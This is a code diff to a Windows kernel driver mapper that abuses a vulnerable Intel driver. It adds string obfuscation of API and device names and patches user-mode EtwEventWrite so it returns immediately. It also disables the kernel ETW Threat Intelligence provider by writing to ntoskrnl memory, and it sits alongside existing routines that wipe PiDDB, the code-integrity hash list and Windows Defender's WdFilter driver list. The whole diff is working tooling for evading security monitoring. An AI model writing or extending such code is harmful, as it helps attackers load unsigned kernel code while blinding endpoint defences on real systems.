@@ -51,7 +51,8 @@ std::wstring intel_driver::GetDriverPath() {
 }
 
 bool intel_driver::IsRunning() {
-	const HANDLE file_handle = CreateFileW(L"\\\\.\\__WDT__", FILE_ANY_ACCESS, 0, nullptr, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, nullptr);
+	auto devPath = ENCW(L"\\\\.\\__WDT__");
+	const HANDLE file_handle = CreateFileW(devPath.c_str(), FILE_ANY_ACCESS, 0, nullptr, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, nullptr);
 	if (file_handle != nullptr && file_handle != INVALID_HANDLE_VALUE)
 	{
 		CloseHandle(file_handle);
@@ -61,7 +62,7 @@ bool intel_driver::IsRunning() {
 }
 
 NTSTATUS intel_driver::AcquireDebugPrivilege() {
-	HMODULE ntdll = GetModuleHandleA("ntdll.dll");
+	HMODULE ntdll = GetModuleHandleA(ENC("ntdll.dll").c_str());
 	if (ntdll == NULL)
 		return STATUS_UNSUCCESSFUL;
 
@@ -69,6 +70,91 @@ NTSTATUS intel_driver::AcquireDebugPrivilege() {
 	BOOLEAN SeDebugWasEnabled;
 	NTSTATUS Status = nt::RtlAdjustPrivilege(SE_DEBUG_PRIVILEGE, TRUE, FALSE, &SeDebugWasEnabled);
 	return Status;
+}
+
+static uint8_t g_EtwOriginalBytes[8] = { 0 };
+static void* g_EtwPatchAddr = nullptr;
+static bool g_EtwPatched = false;
+
+static bool PatchUsermodeEtw() {
+	HMODULE ntdll = GetModuleHandleA(ENC("ntdll.dll").c_str());
+	if (!ntdll)
+		return false;
+
+	auto etwName = ENC("EtwEventWrite");
+	g_EtwPatchAddr = reinterpret_cast<void*>(GetProcAddress(ntdll, etwName.c_str()));
+	if (!g_EtwPatchAddr)
+		return false;
+
+	memcpy(g_EtwOriginalBytes, g_EtwPatchAddr, sizeof(g_EtwOriginalBytes));
+
+	DWORD oldProt = 0;
+	if (!VirtualProtect(g_EtwPatchAddr, sizeof(g_EtwOriginalBytes), PAGE_EXECUTE_READWRITE, &oldProt))
+		return false;
+
+	uint8_t patch[] = { 0x33, 0xC0, 0xC3 };
+	memcpy(g_EtwPatchAddr, patch, sizeof(patch));
+
+	VirtualProtect(g_EtwPatchAddr, sizeof(g_EtwOriginalBytes), oldProt, &oldProt);
+	g_EtwPatched = true;
+	return true;
+}
+
+static void RestoreUsermodeEtw() {
+	if (!g_EtwPatched || !g_EtwPatchAddr)
+		return;
+
+	DWORD oldProt = 0;
+	if (VirtualProtect(g_EtwPatchAddr, sizeof(g_EtwOriginalBytes), PAGE_EXECUTE_READWRITE, &oldProt)) {
+		memcpy(g_EtwPatchAddr, g_EtwOriginalBytes, sizeof(g_EtwOriginalBytes));
+		VirtualProtect(g_EtwPatchAddr, sizeof(g_EtwOriginalBytes), oldProt, &oldProt);
+	}
+
+	g_EtwPatched = false;
+}
+
+static bool DisableKernelEtwTi() {
+	if (!intel_driver::runtimeReady)
+		return false;
+
+	static const uint8_t etwTiGuid[] = {
+		0xF1, 0x54, 0xFC, 0xB8, 0x6D, 0x2E, 0x45, 0xAE,
+		0x84, 0x1D, 0xD2, 0x3E, 0xBC, 0x3B, 0x83, 0xAF
+	};
+
+	BYTE guidSig[] = {
+		0xF1, 0x54, 0xFC, 0xB8, 0x6D, 0x2E, 0x45, 0xAE,
+		0x84, 0x1D, 0xD2, 0x3E, 0xBC, 0x3B, 0x83, 0xAF
+	};
+	char guidMask[] = "xxxxxxxxxxxxxxxx";
+
+	uintptr_t guidAddr = intel_driver::FindPatternInSectionAtKernel(
+		".data", intel_driver::ntoskrnlAddr, guidSig, guidMask);
+
+	if (!guidAddr) {
+		guidAddr = intel_driver::FindPatternInSectionAtKernel(
+			".rdata", intel_driver::ntoskrnlAddr, guidSig, guidMask);
+	}
+
+	if (!guidAddr)
+		return false;
+
+	uint64_t provRegHandle = guidAddr - 0x20;
+
+	uint64_t enableOffset = provRegHandle + 0x30;
+
+	uint32_t enableInfo = 0;
+	if (!intel_driver::ReadMemory(enableOffset, &enableInfo, sizeof(enableInfo)))
+		return false;
+
+	if (enableInfo == 0)
+		return true;
+
+	uint32_t zero = 0;
+	if (!intel_driver::WriteMemory(enableOffset, &zero, sizeof(zero)))
+		return false;
+
+	return true;
 }
 
 static ULONG32 PatchDriverTimestamp(const std::wstring& driver_path) {
@@ -365,28 +451,38 @@ NTSTATUS intel_driver::Load() {
 
 	_wremove(driver_path.c_str());
 
-	if (!kdmUtils::CreateFileFromMemory(driver_path, reinterpret_cast<const char*>(driverData.data()), driverData.size()))
+	PatchUsermodeEtw();
+
+	if (!kdmUtils::CreateFileFromMemory(driver_path, reinterpret_cast<const char*>(driverData.data()), driverData.size())) {
+		RestoreUsermodeEtw();
 		return STATUS_DISK_OPERATION_FAILED;
+	}
 
 	loadedDriverTimestamp = PatchDriverTimestamp(driver_path);
 	if (!loadedDriverTimestamp) {
+		RestoreUsermodeEtw();
 		SecureDeleteFile(driver_path);
 		return STATUS_UNSUCCESSFUL;
 	}
 
 	auto status = AcquireDebugPrivilege();
 	if (!NT_SUCCESS(status)) {
+		RestoreUsermodeEtw();
 		SecureDeleteFile(driver_path);
 		return status;
 	}
 
 	status = service::RegisterAndStart(driver_path, GetDriverNameW());
 	if (!NT_SUCCESS(status)) {
+		RestoreUsermodeEtw();
 		SecureDeleteFile(driver_path);
 		return status;
 	}
 
-	hDevice = CreateFileW(L"\\\\.\\__WDT__", GENERIC_READ | GENERIC_WRITE, 0, nullptr, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
+	auto devOpen = ENCW(L"\\\\.\\__WDT__");
+	hDevice = CreateFileW(devOpen.c_str(), GENERIC_READ | GENERIC_WRITE, 0, nullptr, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
+
+	RestoreUsermodeEtw();
 
 	if (!hDevice || hDevice == INVALID_HANDLE_VALUE)
 	{
@@ -394,7 +490,7 @@ NTSTATUS intel_driver::Load() {
 		return STATUS_NOT_FOUND;
 	}
 
-	ntoskrnlAddr = kdmUtils::GetKernelModuleAddress("ntoskrnl.exe");
+	ntoskrnlAddr = kdmUtils::GetKernelModuleAddress(ENC("ntoskrnl.exe"));
 	if (ntoskrnlAddr == 0) {
 		intel_driver::Unload();
 		return STATUS_BAD_DLL_ENTRYPOINT;
@@ -405,7 +501,7 @@ NTSTATUS intel_driver::Load() {
 		return STATUS_NOT_FOUND;
 	}
 
-	kernel_MmGetPhysicalAddress = GetKernelModuleExport(ntoskrnlAddr, "MmGetPhysicalAddress");
+	kernel_MmGetPhysicalAddress = GetKernelModuleExport(ntoskrnlAddr, ENC("MmGetPhysicalAddress"));
 	if (!kernel_MmGetPhysicalAddress) {
 		intel_driver::Unload();
 		return STATUS_ENTRYPOINT_NOT_FOUND;
@@ -418,6 +514,8 @@ NTSTATUS intel_driver::Load() {
 		intel_driver::Unload();
 		return STATUS_INVALID_IMAGE_FORMAT;
 	}
+
+	DisableKernelEtwTi();
 
 	if (!intel_driver::ClearPiDDBCacheTable()) {
 		intel_driver::Unload();
@@ -443,7 +541,7 @@ NTSTATUS intel_driver::Load() {
 }
 
 bool intel_driver::ClearWdFilterDriverList() {
-	auto WdFilter = kdmUtils::GetKernelModuleAddress("WdFilter.sys");
+	auto WdFilter = kdmUtils::GetKernelModuleAddress(ENC("WdFilter.sys"));
 	if (!WdFilter)
 		return true;
 
@@ -682,7 +780,7 @@ bool intel_driver::ExAcquireResourceExclusiveLite(PVOID Resource, BOOLEAN wait) 
 	if (!Resource)
 		return 0;
 
-	static uint64_t kernel_ExAcquireResourceExclusiveLite = GetKernelModuleExport(intel_driver::ntoskrnlAddr, "ExAcquireResourceExclusiveLite");
+	static uint64_t kernel_ExAcquireResourceExclusiveLite = GetKernelModuleExport(intel_driver::ntoskrnlAddr, ENC("ExAcquireResourceExclusiveLite"));
 	if (!kernel_ExAcquireResourceExclusiveLite)
 		return 0;
 
@@ -694,7 +792,7 @@ bool intel_driver::ExReleaseResourceLite(PVOID Resource) {
 	if (!Resource)
 		return false;
 
-	static uint64_t kernel_ExReleaseResourceLite = GetKernelModuleExport(intel_driver::ntoskrnlAddr, "ExReleaseResourceLite");
+	static uint64_t kernel_ExReleaseResourceLite = GetKernelModuleExport(intel_driver::ntoskrnlAddr, ENC("ExReleaseResourceLite"));
 	if (!kernel_ExReleaseResourceLite)
 		return false;
 
@@ -705,7 +803,7 @@ BOOLEAN intel_driver::RtlDeleteElementGenericTableAvl(PVOID Table, PVOID Buffer)
 	if (!Table)
 		return false;
 
-	static uint64_t kernel_RtlDeleteElementGenericTableAvl = GetKernelModuleExport(intel_driver::ntoskrnlAddr, "RtlDeleteElementGenericTableAvl");
+	static uint64_t kernel_RtlDeleteElementGenericTableAvl = GetKernelModuleExport(intel_driver::ntoskrnlAddr, ENC("RtlDeleteElementGenericTableAvl"));
 	if (!kernel_RtlDeleteElementGenericTableAvl)
 		return false;
 
@@ -717,7 +815,7 @@ PVOID intel_driver::RtlLookupElementGenericTableAvl(nt::PRTL_AVL_TABLE Table, PV
 	if (!Table)
 		return nullptr;
 
-	static uint64_t kernel_RtlLookupElementGenericTableAvl = GetKernelModuleExport(intel_driver::ntoskrnlAddr, "RtlLookupElementGenericTableAvl");
+	static uint64_t kernel_RtlLookupElementGenericTableAvl = GetKernelModuleExport(intel_driver::ntoskrnlAddr, ENC("RtlLookupElementGenericTableAvl"));
 	if (!kernel_RtlLookupElementGenericTableAvl)
 		return nullptr;
 
@@ -858,7 +956,7 @@ uintptr_t intel_driver::FindPatternInSectionAtKernel(const char* sectionName, ui
 }
 
 bool intel_driver::ClearKernelHashBucketList() {
-	uint64_t ci = kdmUtils::GetKernelModuleAddress("ci.dll");
+	uint64_t ci = kdmUtils::GetKernelModuleAddress(ENC("ci.dll"));
 	if (!ci)
 		return false;
 
@@ -950,7 +1048,7 @@ uint64_t intel_driver::AllocatePool(nt::POOL_TYPE pool_type, uint64_t size) {
 	if (!size)
 		return 0;
 
-	static uint64_t kernel_ExAllocatePool = GetKernelModuleExport(intel_driver::ntoskrnlAddr, "ExAllocatePoolWithTag");
+	static uint64_t kernel_ExAllocatePool = GetKernelModuleExport(intel_driver::ntoskrnlAddr, ENC("ExAllocatePoolWithTag"));
 	if (!kernel_ExAllocatePool)
 		return 0;
 
@@ -966,7 +1064,7 @@ bool intel_driver::FreePool(uint64_t address) {
 	if (!address)
 		return 0;
 
-	static uint64_t kernel_ExFreePool = GetKernelModuleExport(intel_driver::ntoskrnlAddr, "ExFreePool");
+	static uint64_t kernel_ExFreePool = GetKernelModuleExport(intel_driver::ntoskrnlAddr, ENC("ExFreePool"));
 	if (!kernel_ExFreePool)
 		return 0;
 
